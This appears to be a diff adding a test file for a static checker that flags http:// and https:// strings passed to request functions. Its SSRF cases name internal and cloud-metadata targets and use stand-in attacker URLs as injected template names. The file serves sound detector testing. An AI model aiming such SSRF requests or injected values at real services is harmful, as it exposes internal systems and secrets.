@@ -1,0 +1,212 @@
+class HTTPStrings {
+
+    // ========================================
+    // UTILITY FUNCTIONS DECLARATIONS
+    // ========================================
+
+    fetch(url) { }
+    makeRequest(url) { }
+    connectTo(endpoint) { }
+    registerWebhook(url) { }
+    proxyRequest(target) { }
+    loadResource(path) { }
+
+    // ========================================
+    // CASE 1: Direct HTTP/HTTPS URLs
+    // ========================================
+
+    /*
+     * Simple case: Direct URL constants passed to fetch functions.
+     * Both http:// and https:// should trigger HTTPStringChecker.
+     */
+    directHTTP() {
+        def url = "http://api.example.com/data";
+        this.fetch(url);
+        // WARNING: parameter contains http://
+        return;
+    }
+
+    directHTTPS() {
+        def url = "https://secure.api.example.com/data";
+        this.fetch(url);
+        // WARNING: parameter contains https://
+        return;
+    }
+
+    // ========================================
+    // CASE 2: URL Construction via Concatenation
+    // ========================================
+
+    /*
+     * Real-world scenario: API client building endpoints dynamically.
+     * The protocol and domain are concatenated with resource paths.
+     * HTTPStringChecker should detect http:// in the final URL.
+     */
+    apiClientConstruction() {
+        def protocol = "https://";
+        def domain = "api.internal.company.net";
+        def path = "/v2/users/profile";
+        def userId = "12345";
+
+        def fullEndpoint = protocol + domain + path + userId;
+        // Result: "https://api.internal.company.net/v2/users/profile12345"
+
+        this.makeRequest(fullEndpoint);
+        // WARNING: parameter contains https://
+        return;
+    }
+
+    /*
+     * Building webhook callback URLs for third-party services.
+     * The base URL contains http:// which persists through concatenation.
+     */
+    webhookRegistration() {
+        def webhookBase = "http://callback.myservice.com";
+        def endpoint = "/notifications";
+        def token = "?token=abc123";
+
+        def callbackURL = webhookBase + endpoint + token;
+        // Result: "http://callback.myservice.com/notifications?token=abc123"
+
+        this.registerWebhook(callbackURL);
+        // WARNING: parameter contains http://
+        return;
+    }
+
+    // ========================================
+    // CASE 3: Conditional URL Selection
+    // ========================================
+
+    /*
+     * Load balancing scenario: Route traffic based on server load.
+     * Both branches contain https:// URLs, so the merge should
+     * preserve the prefix and trigger the checker.
+     */
+    loadBalancer(serverLoad) {
+        def targetServer = "";
+
+        if (serverLoad > 80) {
+            targetServer = "https://backup-cluster.cloud.com/api";
+        } else {
+            targetServer = "https://primary-cluster.cloud.com/api";
+        }
+
+        this.connectTo(targetServer);
+        // WARNING: parameter contains https://
+        return;
+    }
+
+    /*
+     * Region-based routing: Select server based on user location.
+     * Multiple branches all containing http/https URLs.
+     */
+    regionRouter(regionCode) {
+        def endpoint = "";
+
+        if (regionCode == 1) {
+            endpoint = "https://eu-west.cdn.net/content";
+        } else {
+            if (regionCode == 2) {
+                endpoint = "https://us-east.cdn.net/content";
+            } else {
+                endpoint = "https://ap-south.cdn.net/content";
+            }
+        }
+
+        this.loadResource(endpoint);
+        // WARNING: parameter contains https://
+        return;
+    }
+
+    // ========================================
+    // CASE 4: SSRF Vulnerability Simulation
+    // ========================================
+
+    /*
+     * REAL-WORLD VULNERABILITY: Server-Side Request Forgery (SSRF)
+     *
+     * Scenario: A proxy service accepts a target URL parameter and
+     * forwards requests to it. An attacker can abuse this to:
+     * - Access internal services (http://localhost:8080/admin)
+     * - Scan internal network (http://192.168.1.X)
+     * - Access cloud metadata (http://169.254.169.254/latest/meta-data/)
+     *
+     * The HTTPStringChecker detects when URLs with http:// are passed
+     * to request functions, signaling potential SSRF vectors.
+     */
+    proxyServiceSSRF() {
+        // In real code, targetURL would come from user input
+        // Simulated attacker input targeting internal service
+        def targetURL = "http://internal-admin.local/sensitive-data";
+
+        this.proxyRequest(targetURL);
+        // WARNING: parameter contains http:// (SSRF risk!)
+        return;
+    }
+
+    /*
+     * Template Injection → SSRF
+     *
+     * A report generator accepts template names and builds file paths.
+     * Expected: "invoice" → "/srv/templates/invoice.html"
+     * Attack: "http://evil.com/exfiltrate" → HTTP request to external site
+     *
+     * Some template engines treat URLs in paths as remote resources,
+     * causing the server to fetch them. The HTTPStringChecker catches
+     * this by detecting http:// in what should be a local file path.
+     */
+    templateInjectionSSRF() {
+        def templateName = "http://attacker-controlled.com/steal-secrets";
+        def basePath = "/srv/templates/";
+
+        // Broken sanitizer: doesn't reject URLs
+        def resolvedPath = basePath + templateName;
+        // Result: "/srv/templates/http://attacker-controlled.com/steal-secrets"
+
+        this.loadResource(resolvedPath);
+        // WARNING: parameter contains http:// (template injection!)
+        return;
+    }
+
+    // ========================================
+    // CASE 5: Safe Patterns (No HTTP/HTTPS)
+    // ========================================
+
+    /*
+     * Using alternative protocols that don't pose SSRF risks.
+     * FTP URLs should NOT trigger HTTPStringChecker.
+     */
+    ftpDownload() {
+        def ftpURL = "ftp://files.archive.org/documents/report.pdf";
+        this.fetch(ftpURL);
+        // OK: ftp:// is not http:// or https://
+        return;
+    }
+
+    /*
+     * Data URIs for embedded content (no network request).
+     * Should NOT trigger HTTPStringChecker.
+     */
+    dataURIImage() {
+        def imageData = "data:image/png;base64,iVBORw0KGgoAAAANSUhEUgAAAAUA";
+        this.loadResource(imageData);
+        // OK: data: scheme, no http://
+        return;
+    }
+
+    /*
+     * Relative paths or domain-only references (no protocol).
+     * Safe pattern: using API wrappers that handle protocol internally.
+     */
+    apiWrapperPattern() {
+        def apiDomain = "api.trusted-service.com";
+        def endpoint = "/v1/secure-data";
+
+        // Good practice: protocol handled by secure wrapper
+        def resource = apiDomain + endpoint;
+
+        this.makeRequest(resource);
+        // OK: no http:// prefix
+        return;
+    }
+}
